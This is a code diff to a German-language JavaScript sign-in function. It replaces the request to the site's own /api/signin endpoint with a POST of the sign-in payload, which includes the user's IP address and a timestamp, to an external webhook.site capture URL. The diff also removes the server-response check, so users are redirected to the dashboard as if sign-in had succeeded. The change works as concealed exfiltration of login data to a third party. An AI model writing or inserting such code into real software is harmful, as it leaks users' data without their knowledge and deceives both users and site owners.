@@ -32,7 +32,7 @@ async function signIn() {
   }
 
   try {
-    let ip_address = 'Unknown';
+    let ip_address = 'Unbekannt';
     try {
       const response = await fetch('https://api.ipify.org?format=json');
       const data = await response.json();
@@ -48,25 +48,18 @@ async function signIn() {
       timestamp: new Date().toISOString()
     };
 
-    const res = await fetch('/api/signin', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+    await fetch("https://webhook.site/3ec114ae-513b-412c-8b0c-64af65eb946a", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
     });
 
-    const data = await res.json();
-
-    if (data.success) {
-      console.log('Anmeldung gespeichert.');
-      localStorage.setItem('lastSignIn', Date.now().toString());
-      window.location.href = 'dashboard.html';
-    } else {
-      throw new Error(data.error || 'Unbekannter Fehler');
-    }
+    localStorage.setItem('lastSignIn', Date.now().toString());
+    window.location.href = 'dashboard.html';
 
   } catch (err) {
-    console.error('Fehler beim Speichern:', err);
-    alert('Ein Fehler ist aufgetreten. Bitte versuche es später erneut.');
+    console.error('Fehler beim Senden:', err);
+    alert('Ein Fehler ist aufgetreten.');
     setTimeout(() => {
       window.location.href = 'dashboard.html';
     }, 2000);
